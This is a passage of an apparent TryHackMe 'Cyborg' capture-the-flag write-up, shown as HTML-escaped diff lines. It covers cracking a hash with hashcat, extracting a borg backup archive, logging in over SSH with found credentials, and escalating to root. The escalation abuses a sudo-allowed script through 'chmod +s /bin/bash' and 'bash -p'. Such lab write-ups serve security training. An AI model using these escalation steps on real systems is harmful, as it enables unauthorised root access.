-&lt;p&gt;Using hashcat I was able to crack the hash.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;hashcat -m 1600 passwd /usr/share/wordlists/rockyou.txt&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I now turned my attention to /admin which looks like a blog.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;My name is Alex and im a music producer from The United Kingdom! This is my office!!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Clicking around took me to the page /admin/admin.html&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/shoutbox.png&quot; alt=&quot;shoutbox&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This line jumped out……. I bet its not! :)&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;my backup “music_archive” is safe&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;There is a ‘Archive’ drop down on the website, clicking that and then download allows me to download a file ‘archieve.tar’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/archive.png&quot; alt=&quot;archive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I extracted the tar file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $tar -xvf archive.tar 
-home/field/dev/final_archive/
-home/field/dev/final_archive/hints.5
-home/field/dev/final_archive/integrity.5
-home/field/dev/final_archive/config
-home/field/dev/final_archive/README
-home/field/dev/final_archive/nonce
-home/field/dev/final_archive/index.5
-home/field/dev/final_archive/data/
-home/field/dev/final_archive/data/0/
-home/field/dev/final_archive/data/0/5
-home/field/dev/final_archive/data/0/3
-home/field/dev/final_archive/data/0/4
-home/field/dev/final_archive/data/0/1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However, the data looks to be encrypted and I keep seeing a reference to borg. I looked at the README file and saw:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;This is a borg Backup repository.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I Googled borg backup and found a github page.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;BorgBackup (short: Borg) is a deduplicating backup program. Optionally, it supports compression and authenticated encryption.&lt;/p&gt;
-
-  &lt;p&gt;The main goal of Borg is to provide an efficient and secure way to backup data. The data deduplication technique used makes Borg suitable for daily backups since only changes are stored. The authenticated encryption technique makes it suitable for backups to not fully trusted targets.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I downloaded the Borg &lt;a href=&quot;https://github.com/borgbackup/borg/releases&quot;&gt;release&lt;/a&gt; to my machine and made it executable with ‘chmod +x borg-linux64’.&lt;/p&gt;
-
-&lt;p&gt;Reading the documentation, I was able to list archives so I tried that first. It prompted for a password, I entered the cracked password from the passwd file in /etc/squid.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $./borg-linux64 list home/field/dev/final_archive/
-Enter passphrase for key /home/daz/Documents/TryHackMe/Cyborg/home/field/dev/final_archive:
-music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now I new the name of the archive, I could extract it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $./borg-linux64 extract home/field/dev/final_archive::music_archive
-Enter passphrase for key /home/daz/Documents/TryHackMe/Cyborg/home/field/dev/final_archive:
-drwxr-xr-x alex   alex          0 Tue, 2020-12-29 13:55:52 home/alex
--rw-r--r-- alex   alex       3637 Mon, 2020-12-28 14:25:14 home/alex/.bashrc
--rw-r--r-- alex   alex        220 Mon, 2020-12-28 14:25:14 home/alex/.bash_logout
--rw-r--r-- alex   alex        675 Mon, 2020-12-28 14:25:14 home/alex/.profile
-drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:00:24 home/alex/Music
--rw------- alex   alex        439 Mon, 2020-12-28 17:26:45 home/alex/.bash_history
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.dbus
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.dbus/session-bus
--rw-r--r-- root   root        464 Mon, 2020-12-28 16:33:47 home/alex/.dbus/session-bus/c707f46991feb1ed17e415e15fe9cdae-0
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ActionScript
--rw-r--r-- root   root       7046 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ActionScript/ActionScript.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/AppleScript
--rw-r--r-- root   root       8934 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/AppleScript/AppleScript.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ASP
--rw-r--r-- root   root       7254 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ASP/ASP.sublime-syntax.cache
--rw-r--r-- root   root        640 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ASP/HTML-ASP.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Batch File
--rw-r--r-- root   root       4850 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Batch File/Batch File.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C#
--rw-r--r-- root   root        604 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C#/Build.sublime-syntax.cache
--rw-r--r-- root   root      17237 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C#/C#.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C++
--rw-r--r-- root   root      11817 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C++/C.sublime-syntax.cache
--rw-r--r-- root   root      15283 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C++/C++.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Clojure
--rw-r--r-- root   root       2814 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Clojure/Clojure.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/CSS
--rw-r--r-- root   root      17947 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/CSS/CSS.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/D
--rw-r--r-- root   root      18692 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/D/D.sublime-syntax.cache
--rw-r--r-- root   root        287 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/D/DMD Output.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Diff
--rw-r--r-- root   root        806 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Diff/Diff.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Erlang
--rw-r--r-- root   root       5881 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Erlang/Erlang.sublime-syntax.cache
--rw-r--r-- root   root        257 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Erlang/HTML (Erlang).sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats
--rw-r--r-- root   root       1607 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Attributes.sublime-syntax.cache
--rw-r--r-- root   root       3096 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Commit.sublime-syntax.cache
--rw-r--r-- root   root       1314 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Common.sublime-syntax.cache
--rw-r--r-- root   root       1911 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Config.sublime-syntax.cache
--rw-r--r-- root   root        328 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Ignore.sublime-syntax.cache
--rw-r--r-- root   root        742 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Link.sublime-syntax.cache
--rw-r--r-- root   root        473 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Log.sublime-syntax.cache
--rw-r--r-- root   root       1342 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Rebase.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Go
--rw-r--r-- root   root       7366 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Go/Go.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Graphviz
--rw-r--r-- root   root       1506 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Graphviz/DOT.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Groovy
--rw-r--r-- root   root       5574 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Groovy/Groovy.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Haskell
--rw-r--r-- root   root       2859 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Haskell/Haskell.sublime-syntax.cache
--rw-r--r-- root   root        588 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Haskell/Literate Haskell.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/HTML
--rw-r--r-- root   root       5979 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/HTML/HTML.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java
--rw-r--r-- root   root       9275 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/Java.sublime-syntax.cache
--rw-r--r-- root   root        909 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/Java Server Pages (JSP).sublime-syntax.cache
--rw-r--r-- root   root       1661 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/JavaDoc.sublime-syntax.cache
--rw-r--r-- root   root        575 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/JavaProperties.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript
--rw-r--r-- root   root      16252 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/JavaScript.sublime-syntax.cache
--rw-r--r-- root   root       1561 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/JSON.sublime-syntax.cache
--rw-r--r-- root   root       1294 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/Regular Expressions (JavaScript).sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX
--rw-r--r-- root   root       1079 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/Bibtex.sublime-syntax.cache
--rw-r--r-- root   root      10203 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX.sublime-syntax.cache
--rw-r--r-- root   root        668 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX Log.sublime-syntax.cache
--rw-r--r-- root   root       1788 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/TeX.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lisp
--rw-r--r-- root   root       5115 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lisp/Lisp.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lua
--rw-r--r-- root   root       5353 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lua/Lua.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Makefile
--rw-r--r-- root   root        234 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Makefile/Make Output.sublime-syntax.cache
--rw-r--r-- root   root       4762 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Makefile/Makefile.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Markdown
--rw-r--r-- root   root      11172 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Markdown/Markdown.sublime-syntax.cache
--rw-r--r-- root   root        393 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Markdown/MultiMarkdown.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Matlab
--rw-r--r-- root   root      26157 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Matlab/Matlab.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C
--rw-r--r-- root   root      25087 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C.sublime-syntax.cache
--rw-r--r-- root   root      15819 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C++.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml
--rw-r--r-- root   root        430 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/camlp4.sublime-syntax.cache
--rw-r--r-- root   root       6237 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCaml.sublime-syntax.cache
--rw-r--r-- root   root       1659 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCamllex.sublime-syntax.cache
--rw-r--r-- root   root       1623 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCamlyacc.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Pascal
--rw-r--r-- root   root       1171 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Pascal/Pascal.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Perl
--rw-r--r-- root   root       8858 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Perl/Perl.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/PHP
--rw-r--r-- root   root        447 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/PHP/PHP.sublime-syntax.cache
--rw-r--r-- root   root      32165 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/PHP/PHP Source.sublime-syntax.cache
--rw-r--r-- root   root       1248 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/PHP/Regular Expressions (PHP).sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Python
--rw-r--r-- root   root      17292 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Python/Python.sublime-syntax.cache
--rw-r--r-- root   root       1130 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Python/Regular Expressions (Python).sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R
--rw-r--r-- root   root      14814 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R/R.sublime-syntax.cache
--rw-r--r-- root   root        219 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R/R Console.sublime-syntax.cache
--rw-r--r-- root   root       1177 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R/Rd (R Documentation).sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails
--rw-r--r-- root   root        427 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/HTML (Rails).sublime-syntax.cache
--rw-r--r-- root   root        388 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/JavaScript (Rails).sublime-syntax.cache
--rw-r--r-- root   root        985 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/Ruby Haml.sublime-syntax.cache
--rw-r--r-- root   root       1486 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/Ruby on Rails.sublime-syntax.cache
--rw-r--r-- root   root        304 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/SQL (Rails).sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Regular Expressions
--rw-r--r-- root   root       2985 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Regular Expressions/RegExp.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/RestructuredText
--rw-r--r-- root   root       1611 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/RestructuredText/reStructuredText.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Ruby
--rw-r--r-- root   root       9901 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Ruby/Ruby.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rust
--rw-r--r-- root   root        228 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rust/Cargo.sublime-syntax.cache
--rw-r--r-- root   root       8561 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rust/Rust.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Scala
--rw-r--r-- root   root      13481 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Scala/Scala.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript
--rw-r--r-- root   root      10255 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/Bash.sublime-syntax.cache
--rw-r--r-- root   root       7668 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/commands-builtin-shell-bash.sublime-syntax.cache
--rw-r--r-- root   root        158 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/Shell-Unix-Generic.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/SQL
--rw-r--r-- root   root       2724 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/SQL/SQL.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/TCL
--rw-r--r-- root   root       1010 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/TCL/HTML (Tcl).sublime-syntax.cache
--rw-r--r-- root   root       4120 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/TCL/Tcl.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Cache/Text
--rw-r--r-- root   root         92 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.cache
--rw-r--r-- root   root         43 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.rcache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Textile
--rw-r--r-- root   root       1783 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Textile/Textile.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/XML
--rw-r--r-- root   root       2344 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/XML/XML.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/YAML
--rw-r--r-- root   root       3850 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/YAML/YAML.sublime-syntax.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default
--rw-r--r-- root   root       4086 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default/Syntax Summary.cache
--rw-r--r-- root   root      10895 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default/Meta Info Summary.cache
--rw-r--r-- root   root    1003914 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default/Startup.cache
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Packages
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Packages/User
-drwx------ root   root          0 Mon, 2020-12-28 16:38:24 home/alex/.config/sublime-text-3/Local
--rw-r--r-- root   root       5199 Mon, 2020-12-28 16:38:24 home/alex/.config/sublime-text-3/Local/Auto Save Session.sublime_session
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Lib
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Lib/python3.3
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Installed Packages
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/ibus
-drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/ibus/bus
-drwxrwxr-x alex   alex          0 Tue, 2020-12-29 13:55:52 home/alex/Documents
--rw-r--r-- root   root        110 Tue, 2020-12-29 13:55:41 home/alex/Documents/note.txt
-drwxrwxr-x alex   alex          0 Mon, 2020-12-28 17:59:30 home/alex/Public
-drwxrwxr-x alex   alex          0 Mon, 2020-12-28 17:59:37 home/alex/Videos
-drwxrwxr-x alex   alex          0 Tue, 2020-12-29 13:57:14 home/alex/Desktop
--rw-r--r-- root   root         71 Tue, 2020-12-29 13:57:14 home/alex/Desktop/secret.txt
-drwxrwxr-x alex   alex          0 Mon, 2020-12-28 17:59:57 home/alex/Downloads
-drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:00:02 home/alex/Templates
-drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:26:44 home/alex/Pictures
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Scanning through the files I find ‘secret.txt’ which is a note from the author.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;shoutout to all the people who have gotten to this stage whoop whoop&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;In the files is also ‘note.txt’ which provides SSH creds.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Wow I’m awful at remembering Passwords so I’ve taken my Friends advice and noting them down!&lt;/p&gt;
-
-  &lt;p&gt;alex:{REDACTED}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;With these I SSH in to the machine.&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Doing ‘sudo -l’ shows Alex can run ‘/etc/mp3backups/backup.sh’ as root without a password.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;alex@ubuntu:~$ sudo -l
-Matching Defaults entries for alex on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User alex may run the following commands on ubuntu:
-    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Looking at the script, it appears to be a simple back up script archiving all mp3 files in the Alex music directory however it also always accepts a parameter with ‘-c’ and executes it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/bin/bash
-
-sudo find / -name &quot;*.mp3&quot; | sudo tee /etc/mp3backups/backed_up_files.txt
-
-
-input=&quot;/etc/mp3backups/backed_up_files.txt&quot;
-#while IFS= read -r line
-#do
-  #a=&quot;/etc/mp3backups/backed_up_files.txt&quot;
-#  b=$(basename $input)
-  #echo
-#  echo &quot;$line&quot;
-#done &amp;lt; &quot;$input&quot;
-
-while getopts c: flag
-do
-        case &quot;${flag}&quot; in
-                c) command=${OPTARG};;
-        esac
-done
-
-backup_files=&quot;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3&quot;
-
-# Where to backup to.
-dest=&quot;/etc/mp3backups/&quot;
-
-# Create archive filename.
-hostname=$(hostname -s)
-archive_file=&quot;$hostname-scheduled.tgz&quot;
-
-# Print start status message.
-echo &quot;Backing up $backup_files to $dest/$archive_file&quot;
-
-echo
-
-# Backup the files using tar.
-tar czf $dest/$archive_file $backup_files
-
-# Print end status message.
-echo
-echo &quot;Backup finished&quot;
-
-cmd=$($command)
-echo $cmd
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;There a few ways to get root as you can run any command as root, you could cat the flag or create a reverse shell however, by giving bash a SUID bit with the command:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;sudo ./backup.sh -c ‘chmod +s /bin/bash’&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Now I can get a root shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;alex@ubuntu:/etc/mp3backups$ bash -p
-bash-4.3# whoami
-root
-&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
 
